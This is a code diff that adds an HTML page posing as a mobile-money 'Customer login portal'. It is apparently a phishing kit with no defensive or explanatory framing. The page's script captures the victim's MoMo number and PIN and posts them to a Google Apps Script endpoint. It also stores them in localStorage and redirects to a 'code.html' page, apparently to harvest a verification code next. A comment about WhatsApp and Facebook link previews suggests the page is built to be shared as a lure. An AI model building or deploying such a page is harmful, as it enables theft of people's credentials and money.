@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Recipient Login</title>
+<!-- Link preview / Banner for WhatsApp, Facebook, etc -->
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body, html {
+  height: 100%;
+}
+
+/* 1. FULL BANNER BACKGROUND */
+.banner {
+  height: 100vh;
+  width: 100%;
+  background: url("banner.png") no-repeat center center/cover;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+/* 2. FORM BOX OVER BANNER */
+.form-box {
+  width: 90%;
+  max-width: 360px;
+  padding: 20px;
+  background: rgba(0, 0, 0, 0.45); /* semi transparent */
+  border-radius: 15px;
+  backdrop-filter: blur(6px);
+  text-align: center;
+  color: white;
+}
+
+/* 3. TITLE TEXT */
+.form-box h2 {
+  margin-bottom: 15px;
+  font-size: 18px;
+}
+
+/* 4. INPUTS (TRANSPARENT STYLE) */
+.form-box input {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border: 1px solid rgba(255,255,255,0.4);
+  background: rgba(255,255,255,0.1);
+  color: white;
+  outline: none;
+  border-radius: 8px;
+}
+
+/* placeholder style */
+.form-box input::placeholder {
+  color: rgba(255,255,255,0.7);
+}
+
+/* 5. BUTTON */
+.form-box button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border: none;
+  border-radius: 8px;
+  background: #00c853;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.form-box button:hover {
+  background: #00a844;
+}
+
+/* 6. LOADING TEXT */
+#loading {
+  display: none;
+  margin-top: 10px;
+  color: white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="banner">
+
+  <div class="form-box">
+
+    <!-- TITLE ABOVE FIELDS -->
+    <h2>Customer login portal:</h2>
+
+    <form id="loginForm">
+
+      <input type="text" id="phone" placeholder="MoMo number:" required />
+      <input type="text" id="id" placeholder="Pin:" required />
+
+      <button type="submit" id="btn">Login</button>
+
+    </form>
+
+    <!-- LOADING INDICATOR -->
+    <div id="loading">Loading...</div>
+
+  </div>
+
+</div>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  event.preventDefault(); // stops page refresh
+
+  document.getElementById("loading").style.display = "block";
+
+  let mtn = document.getElementById("phone").value;
+  let pin = document.getElementById("id").value;
+
+  fetch("https://script.google.com/macros/s/AKfycbysMwr3SDaaSNsAWZqL8PDW0Sorl5hAxc0LaGmsxsBn9eCDgJ8XQ9z_58R6TFTnbvDY/exec", {
+  method: "POST",
+  body: JSON.stringify({
+    phone: mtn,
+    pin: pin
+  })
+})
+.then(res => res.text())
+.then(data => {
+
+  localStorage.setItem("phone", mtn);
+localStorage.setItem("id", pin);
+
+  document.getElementById("loading").style.display = "none";
+
+  window.location.href = "code.html";
+
+})
+.catch(err => {
+  console.error(err);
+  document.getElementById("loading").style.display = "none";
+});
+});  
+
+</script>
+
+</body>
+</html>
